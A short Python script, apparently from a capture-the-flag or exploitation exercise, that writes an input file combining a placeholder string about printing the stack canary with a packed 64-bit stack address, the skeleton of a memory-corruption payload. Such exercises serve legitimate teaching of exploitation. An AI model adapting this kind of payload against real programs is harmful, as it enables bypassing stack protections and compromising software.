#!/usr/bin/python
from struct import *

buf = ""
buf += "print the stack canary value"
buf += pack("<Q",0x7fffffffebed)


f = open("in.txt","w")
f.write(buf)
f.close()

